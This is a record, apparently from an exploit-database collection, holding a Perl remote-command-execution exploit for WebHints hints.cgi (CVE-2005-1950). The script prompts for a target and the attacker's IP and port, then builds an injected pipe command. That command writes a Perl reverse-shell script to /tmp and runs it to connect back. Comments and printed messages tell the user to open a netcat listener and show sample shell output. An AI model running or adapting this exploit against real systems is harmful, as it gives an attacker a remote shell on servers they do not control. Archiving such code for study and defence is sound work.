{
  "id": "1041",
  "title": "Webhints 1.03 - Remote Command Execution (Perl) (3)",
  "cve": "CVE-2005-1950",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\n#\r\n#\r\n#emanuele@blackbox:~$ perl M4DR007-hints.pl\r\n#\r\n#\r\n# ~~ www.madroot.edu.ms Security Group ~~\r\n#\r\n# WebHints Software hints.cgi\r\n# Remote Command Execution Vulnerability\r\n# Affected version: <= all\r\n# ~~ code by MadSheep ~~\r\n#\r\n#\r\n# 06.11.2005\r\n#\r\n#\r\n#hostname:\r\n#localhost\r\n#port: (default: 80)\r\n#80\r\n#path: (/cgi-bin/)\r\n#/cgi-bin/\r\n#your ip (for reverse connect):\r\n#127.0.0.1\r\n#your port (for reverse connect):\r\n#7350\r\n#\r\n#\r\n#~~~~~~~~~~~~~~~~~~~~START~~~~~~~~~~~~~~~~~\r\n#[*] try to exploiting...\r\n#[*] OK!\r\n#[*] NOW, run in your box: nc -l -vv -p 7350\r\n#[*] starting connect back on 127.0.0.1 :7350\r\n#[*] DONE!\r\n#[*] Look netcat windows and funny\r\n#\r\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n# WARNING - WARNING - WARNING - WARNING\r\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#\r\n#If connect back shell not found:\r\n#- you do not have privileges to write in /tmp\r\n#- Shell not vulnerable\r\n#\r\n#\r\n#We r: MadSheep - Punish3r - Spastic_eye - seth - Groove - Mrk\r\n#\r\n#\r\n#emanuele@blackbox:~$\r\n#\r\n#\r\n#emanuele@blackbox:~$ nc -l -vv -p 7350\r\n#\r\n# uid=1001(madhseep) gid=1001(madsheep) grupos=1001(madsheep)\r\n#\r\n#\r\n#\r\n# Come cheer us at #madroot on Freenode ( irc.freenode.net )\r\n#\r\n# (C) 2005 Copyright by madroot Security Group\r\n#\r\n#############################################\r\nuse IO::Socket;\r\n\r\nprint \"\\n\\n ~~ www.madroot.edu.ms Security Group ~~ \\n\\n\";\r\nprint \" WebHints Software hints.cgi\\n\";\r\nprint \" Remote Command Execution Vulnerability\\n\";\r\nprint \" Affected version: <= all \\n\";\r\nprint \" ~~ code by MadSheep ~~\\n\\n\\n\";\r\nprint \" 06.11.2005\\n\\n\\n\";\r\n\r\n\r\nprint \"hostname: \\n\";\r\nchomp($server=<STDIN>);\r\n\r\nprint \"port: (default: 80)\\n\";\r\nchomp($port=<STDIN>);\r\n$port=80 if ($port =~/\\D/ );\r\n$port=80 if ($port eq \"\" );\r\n\r\nprint \"path: (/cgi-bin/)\\n\";\r\nchomp($path=<STDIN>);\r\n\r\nprint \"your ip (for reverse connect): \\n\";\r\nchomp($ip=<STDIN>);\r\n\r\nprint \"your port (for reverse connect): \\n\";\r\nchomp($reverse=<STDIN>);\r\n\r\n\r\nprint \" \\n\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~START~~~~~~~~~~~~~~~~~\\r\\n\";\r\n\r\nprint \"[*] try to exploiting...\\n\";\r\n\r\n$string=\"/$path/hints.pl?|cd /tmp;echo \".q{use Socket;$execute= 'echo \"`uname -a`\";echo \"`id`\";/bin/sh';$target=$ARGV[0];$port=$ARGV[1];$iaddr=inet_aton($target) || die(\"Error: $!\\n\");$paddr=sockaddr_in($port, $iaddr) || die(\"Error: $!\\n\");$proto=getprotobyname('tcp');socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(\"Error: $!\\n\");connect(SOCKET, $paddr) || die(\"Error: $!\\n\");open(STDIN, \">&SOCKET\");open(STDOUT, \">&SOCKET\");open(STDERR, \">&SOCKET\");system($execute);close(STDIN)}.\" >>cbs.pl;perl cbs.pl $ip $reverse|\";\r\n\r\nprint \"[*] OK! \\n\";\r\nprint \"[*] NOW, run in your box: nc -l -vv -p $reverse\\n\";\r\nprint \"[*] starting connect back on $ip :$reverse\\n\";\r\nprint \"[*] DONE!\\n\";\r\nprint \"[*] Look netcat windows and funny\\n\\n\";\r\n$socket=IO::Socket::INET->new( PeerAddr => $server, PeerPort => $port, Proto => tcp)\r\nor die;\r\n\r\n\r\nprint $socket \"POST $path HTTP/1.1\\n\";\r\nprint $socket \"Host: $server\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"User-Agent: M4DR007\\n\";\r\nprint $socket \"Pragma: no-cache\\n\";\r\nprint $socket \"Cache-Control: no-cache\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\n\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\nprint \" WARNING - WARNING - WARNING - WARNING   \\r\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\\n\";\r\nprint \"If connect back shell not found:\\n\";\r\nprint \"- you do not have privileges to write in /tmp\\n\";\r\nprint \"- Shell not vulnerable\\n\\n\\n\";\r\nprint \"We r: MadSheep - Punish3r - Spastic_eye - seth - Groove - Mrk\\n\\n\\n\";\r\n\r\n# milw0rm.com [2005-06-11]",
  "url": "https://www.exploit-db.com/exploits/1041"
}